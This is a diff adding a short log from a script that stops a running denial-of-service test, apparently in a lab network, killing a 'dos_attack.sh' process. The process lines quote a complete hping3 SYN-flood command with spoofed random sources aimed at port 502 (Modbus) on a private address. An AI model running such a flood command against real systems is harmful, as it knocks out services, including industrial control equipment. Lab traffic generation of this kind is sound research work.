@@ -1,0 +1,23 @@
+STOP SCRIPT START 2025-10-06 21:49:11
+pidfile: /tmp/attack.pid
+Reading pidfile /tmp/attack.pid
+checking pid 5185
+cmdline: tee dos_hping3_synflood_2025-10-06_21-39.log 
+pid 5185 cmdline does not match basename dos_attack.sh hping3_synflood 172.27.224.250 eth1, skipping
+checking pid 5188
+cmdline: hping3 -I eth1 -d 120 -S -P -w 64 -p 502 --flood --rand-source 172.27.224.250 
+pid 5188 cmdline does not match basename dos_attack.sh hping3_synflood 172.27.224.250 eth1, skipping
+checking pid 5184
+cmdline: sudo hping3 -I eth1 -d 120 -S -P -w 64 -p 502 --flood --rand-source 172.27.224.250 
+pid 5184 cmdline does not match basename dos_attack.sh hping3_synflood 172.27.224.250 eth1, skipping
+checking pid 5181
+cmdline: /bin/bash /temp/dos_attack.sh hping3_synflood 172.27.224.250 eth1 
+Attempting pkill -TERM -P 5181 (children)
+Attempting kill -TERM 5181
+pid 5181 terminated
+Fallback: pkill -TERM -f /temp/dos_attack.sh hping3_synflood 172.27.224.250 eth1
+Fallback: pkill -TERM -f dos_attack.sh hping3_synflood 172.27.224.250 eth1
+Fallback escalate: KILL patterns
+Remaining pgrep -af dos_attack.sh hping3_synflood 172.27.224.250 eth1:
+no process match
+STOP SCRIPT END 2025-10-06 21:49:13
